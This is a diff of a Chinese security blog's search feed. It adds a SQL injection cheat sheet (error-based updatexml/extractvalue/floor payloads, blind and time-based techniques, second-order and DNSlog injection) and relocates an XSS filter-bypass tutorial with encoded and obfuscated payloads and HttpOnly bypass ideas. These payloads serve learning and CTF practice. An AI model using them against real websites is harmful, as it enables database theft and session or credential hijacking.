     <content><![CDATA[<p>题目是墨者里的一道入门题</p>
@@ -2976,6 +2920,62 @@ limit x,1</strong>
 StormGroup_member limit 1,1</strong></p>
 <p><img src="/2022/01/08/sql%E6%B3%A8%E5%85%A5/6.png"></p>
 <p>将密码用md5解密，登录成功后即可获得key</p>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入</title>
+    <url>/2022/03/17/sql%E6%B3%A8%E5%85%A5-1/</url>
+    <content><![CDATA[<h2 id="一报错盲注">一、报错盲注</h2>
+<h3 id="通过updatexml报错">1、通过updatexml报错</h3>
+<p>爆数据库名：<code>'and(select updatexml(1,concat(0x7e,(select database())),0x7e))--+</code></p>
+<p>爆表名：<code>'and(select updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),0x7e))--+</code></p>
+<p>爆列名：<code>'and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=TABLE_NAME)),0x7e))--+</code></p>
+<p>爆字段数据：<code>'and(select updatexml(1,concat(0x7e,(select group_concat(COLUMN_NAME)from TABLE_NAME)),0x7e))--+</code></p>
+<h3 id="通过floor报错">2、通过floor报错</h3>
+<p><code>'and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</code></p>
+<h3 id="通过extractvalue报错">3、通过extractvalue报错</h3>
+<p>爆数据库名：<code>'and(select extractvalue(1,concat(0x7e,(select database()))))--+</code></p>
+<p>爆表名：<code>'and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))--+</code></p>
+<p>爆列名：<code>'and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=TABLE_NAME))))--+</code></p>
+<p>爆字段数据：<code>'and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME))))--+</code></p>
+<h2 id="二布尔盲注">二、布尔盲注</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">like &#x27;ro%&#x27;						#判断ro或ro...是否成立</span><br><span class="line">regexp &#x27;^guet[a-z]&#x27;					#匹配guet及guet...等</span><br><span class="line">left(database(),b)					#从左侧截取database名的前b位</span><br><span class="line">length(database())=8					#判断数据库database()名的长度</span><br><span class="line">substr(a,b,c)						#从位置b开始，截取字符串a的c长度</span><br><span class="line">mid(a,b,c)						#从位置b开始，截取字符串a的c位</span><br><span class="line">ascii()							#返回字符ascii码值</span><br></pre></td></tr></table></figure>
+<p><strong>注入流程</strong>：</p>
+<ul>
+<li>数据库长度</li>
+<li>数据库表的ascii</li>
+<li>数据库中表的个数</li>
+<li>数据库中其中一个表名的长度</li>
+<li>数据库中其中一个表名的ascii</li>
+<li>列名的数量</li>
+<li>列名的长度</li>
+<li>列名的ascii</li>
+<li>字段的数量</li>
+<li>字段内容的长度</li>
+<li>字段内容对应的ascii</li>
+</ul>
+<h2 id="三延时盲注">三、延时盲注</h2>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,A,B)					#如果condition为true，返回A；反之返回B</span><br><span class="line">sleep()							#sql语句延时执行</span><br><span class="line">ascii(x)=97						#判断x的ascii码是否等于97</span><br></pre></td></tr></table></figure>
+<h2 id="四加解密注入">四、加解密注入</h2>
+<p>很多情况下，网站管理员经常会对传进的参数进行一个加密的操作，加密有可能是自己写，也有可能是base64、md5等等常见的加密</p>
+<p>这种情况下，我们传注入语句的时候就要传对应的加密的内容</p>
+<h2 id="五二次注入">五、二次注入</h2>
+<ol type="1">
+<li><p>插入恶意数据</p>
+<p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。</p></li>
+<li><p>引用恶意数据</p>
+<p>在将数据存入到了数据库中之后，开发者就认为数据是可信的，在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。</p></li>
+</ol>
+<h2 id="六dns注入">六、DNS注入</h2>
+<p>DNSlog主要解决盲注不能回显数据、效率低的问题</p>
+<p>适合的网站：http://ceye.io</p>
 ]]></content>
       <categories>
         <category>搞渗透</category>
@@ -3461,6 +3461,59 @@ https://www.phpbug.cn/archives/32.html</p>
       </tags>
   </entry>
   <entry>
+    <title>XSS各种绕过姿势</title>
+    <url>/2022/03/19/xss/</url>
+    <content><![CDATA[<h1 id="x01-分类">0x01 分类</h1>
+<h2 id="反射型">1、反射型</h2>
+<p>也分为GET和POST两种，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
+<h2 id="存储型">2、存储型</h2>
+<p>持久化，代码是存储在服务器中的，如在个人信息、发表文章、发表评论等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p>
+<h2 id="dom型">3、DOM型</h2>
+<p>不经过后端，基于文档对象模型的一种漏洞，它是通过url传入参数去控制触发的，其实也属于反射型。</p>
+<h1 id="x02-绕过方法">0x02 绕过方法</h1>
+<h2 id="一过滤关键字">一、过滤关键字</h2>
+<h3 id="大小写绕过">1.1 大小写绕过</h3>
+<p><code>&lt;a Href="JavasCript:aLert('xss')"&gt;</code></p>
+<h3 id="双写关键字绕过">1.2 双写关键字绕过</h3>
+<p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过：</p>
+<p><code>&lt;a hhrefref="javascripscriptt:alert('xss')"&gt;</code></p>
+<h3 id="字符串拼接">1.3 字符串拼接</h3>
+<ol type="1">
+<li><p>通过利用eval函数：</p>
+<p><code>&lt;a href="a='javascri';b='pt:aler';c='t';d='('xss')';eval(a+b+c+d)"&gt;</code></p></li>
+<li><p>通过利用top函数：</p>
+<p><code>&lt;script&gt;top["ale"+"rt"]('xss')&lt;/script&gt;</code></p></li>
+</ol>
+<h3 id="使用注释进行干扰绕过">1.4 使用注释进行干扰绕过</h3>
+<p><code>&lt;scri&lt;!--aaa--&gt;pt&gt;alert(123)&lt;/scri&lt;!--bbb--&gt;pt&gt;</code></p>
+<h3 id="编码绕过">1.5 编码绕过</h3>
+<ol type="1">
+<li><p>Unicode编码绕过</p>
+<p><code>&lt;a href="&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;"&gt;</code></p>
+<p><code>&lt;a href="\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029"&gt;</code></p></li>
+<li><p>url编码绕过</p>
+<p><code>&lt;a href="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%78%73%73%27%29"&gt;</code></p></li>
+<li><p>Ascii码绕过</p>
+<p><code>&lt;a href=""&gt;</code></p></li>
+</ol>
+<h2 id="三httponly">三、HttpOnly</h2>
+<p>HttpOnly是Set-Cookie
+HTTP响应头中包含的<em>附加标志</em>，开启后如果检测到检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取cookie，则浏览器会返回一个空字符作为结果。这样可以防止恶意（通常是XSS）代码将数据发送到攻击者的网站，从而导致攻击失败。</p>
+<h3 id="绕过方法">3.1、绕过方法</h3>
+<ol type="1">
+<li>浏览器未保存账号密码，需要xss产生登录地址，利用表单劫持</li>
+<li>浏览器保存密码，产生在后台的xss，存储型xss如留言等，浏览器读取账号密码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>xss</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>解析漏洞</title>
     <url>/2022/01/09/upload/</url>
     <content><![CDATA[<h1 id="x01-iis5.x6.0解析漏洞">0x01 IIS5.x/6.0解析漏洞</h1>
@@ -3518,59 +3571,6 @@ Nginx&lt;8.03空字节代码执行漏洞</h1>
       <tags>
         <tag>web</tag>
         <tag>文件上传</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XSS各种绕过姿势</title>
-    <url>/2022/03/19/xss/</url>
-    <content><![CDATA[<h1 id="x01-分类">0x01 分类</h1>
-<h2 id="反射型">1、反射型</h2>
-<p>也分为GET和POST两种，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。</p>
-<h2 id="存储型">2、存储型</h2>
-<p>持久化，代码是存储在服务器中的，如在个人信息、发表文章、发表评论等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。</p>
-<h2 id="dom型">3、DOM型</h2>
-<p>不经过后端，基于文档对象模型的一种漏洞，它是通过url传入参数去控制触发的，其实也属于反射型。</p>
-<h1 id="x02-绕过方法">0x02 绕过方法</h1>
-<h2 id="一过滤关键字">一、过滤关键字</h2>
-<h3 id="大小写绕过">1.1 大小写绕过</h3>
-<p><code>&lt;a Href="JavasCript:aLert('xss')"&gt;</code></p>
-<h3 id="双写关键字绕过">1.2 双写关键字绕过</h3>
-<p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过：</p>
-<p><code>&lt;a hhrefref="javascripscriptt:alert('xss')"&gt;</code></p>
-<h3 id="字符串拼接">1.3 字符串拼接</h3>
-<ol type="1">
-<li><p>通过利用eval函数：</p>
-<p><code>&lt;a href="a='javascri';b='pt:aler';c='t';d='('xss')';eval(a+b+c+d)"&gt;</code></p></li>
-<li><p>通过利用top函数：</p>
-<p><code>&lt;script&gt;top["ale"+"rt"]('xss')&lt;/script&gt;</code></p></li>
-</ol>
-<h3 id="使用注释进行干扰绕过">1.4 使用注释进行干扰绕过</h3>
-<p><code>&lt;scri&lt;!--aaa--&gt;pt&gt;alert(123)&lt;/scri&lt;!--bbb--&gt;pt&gt;</code></p>
-<h3 id="编码绕过">1.5 编码绕过</h3>
-<ol type="1">
-<li><p>Unicode编码绕过</p>
-<p><code>&lt;a href="&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#115;&amp;#115;&amp;#39;&amp;#41;"&gt;</code></p>
-<p><code>&lt;a href="\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029"&gt;</code></p></li>
-<li><p>url编码绕过</p>
-<p><code>&lt;a href="%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%78%73%73%27%29"&gt;</code></p></li>
-<li><p>Ascii码绕过</p>
-<p><code>&lt;a href=""&gt;</code></p></li>
-</ol>
-<h2 id="三httponly">三、HttpOnly</h2>
-<p>HttpOnly是Set-Cookie
-HTTP响应头中包含的<em>附加标志</em>，开启后如果检测到检测到包含HttpOnly标志的cookie，并且客户端脚本代码尝试读取cookie，则浏览器会返回一个空字符作为结果。这样可以防止恶意（通常是XSS）代码将数据发送到攻击者的网站，从而导致攻击失败。</p>
-<h3 id="绕过方法">3.1、绕过方法</h3>
-<ol type="1">
-<li>浏览器未保存账号密码，需要xss产生登录地址，利用表单劫持</li>
-<li>浏览器保存密码，产生在后台的xss，存储型xss如留言等，浏览器读取账号密码</li>
-</ol>
-]]></content>
-      <categories>
-        <category>搞渗透</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
